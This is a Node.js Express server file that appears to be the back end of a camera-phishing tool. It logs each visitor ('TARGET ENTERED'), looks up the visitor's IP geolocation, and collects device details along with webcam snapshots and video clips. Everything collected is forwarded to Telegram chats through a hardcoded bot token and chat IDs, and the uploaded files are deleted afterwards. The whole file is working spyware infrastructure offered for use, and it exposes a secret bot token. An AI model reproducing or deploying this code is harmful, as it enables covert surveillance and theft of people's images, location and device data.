const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const useragent = require('useragent'); // npm install useragent

const app = express();

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '6809680349:AAF2IEY9Imtc3WIF7OIdYoDvn9LOnbT9kI0';
const CHAT_IDS = ['6146766939', '6230067336'];

// Folder check
['./images', './videos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.set('view engine', 'ejs');
app.use(express.static('public'));

// Helper: Send Text
async function sendToTelegram(msg) {
    for (const id of CHAT_IDS) {
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: id, text: msg, parse_mode: 'HTML', disable_web_page_preview: true
            });
        } catch (e) { console.log("Telegram Text Error"); }
    }
}

// Helper: Send Media
async function sendMedia(filePath, caption, type) {
    for (const id of CHAT_IDS) {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('caption', caption);
        const method = type === 'photo' ? 'sendPhoto' : 'sendVideo';
        formData.append(type === 'photo' ? 'photo' : 'video', fs.createReadStream(filePath));

        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`, formData, {
                headers: formData.getHeaders()
            });
        } catch (e) { console.log("Telegram Media Error"); }
    }
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
}

// Routes
app.get('/', (req, res) => { res.render('index'); });

app.post('/info', async (req, res) => {
    const d = req.body;
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip.includes(',')) ip = ip.split(',')[0];
    
    let location = "N/A";
    try {
        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
        if(geo.data.status === 'success') {
            location = `${geo.data.city}, ${geo.data.country}\n🏢 <b>ISP:</b> ${geo.data.isp}`;
        }
    } catch (e) { location = "Lookup Failed"; }

    const report = `⚠️ <b>TARGET ENTERED</b>\n\n` +
                   `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                   `📍 <b>Location:</b> ${location}\n` +
                   `📱 <b>OS:</b> ${d.model}\n` +
                   `🔋 <b>Battery:</b> ${d.battery}\n` +
                   `🖥️ <b>Screen:</b> ${d.screen}\n` +
                   `🧠 <b>RAM:</b> ${d.ram}`;
    
    sendToTelegram(report);
    res.send('ok');
});

app.post('/camsnap', (req, res) => {
    const base64Data = req.body.img.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, 'images', `s_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendMedia(filePath, "📸 Target Snapshot", 'photo');
    res.send('ok');
});

app.post('/video-upload', (req, res) => {
    const base64Data = req.body.video.replace(/^data:video\/webm;base64,/, "");
    const filePath = path.join(__dirname, 'videos', `v_${Date.now()}.webm`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendMedia(filePath, "🎥 Target Video Clip", 'video');
    res.send('ok');
});

app.listen(3000, () => console.log("🚀 Server Active on Port 3000"));
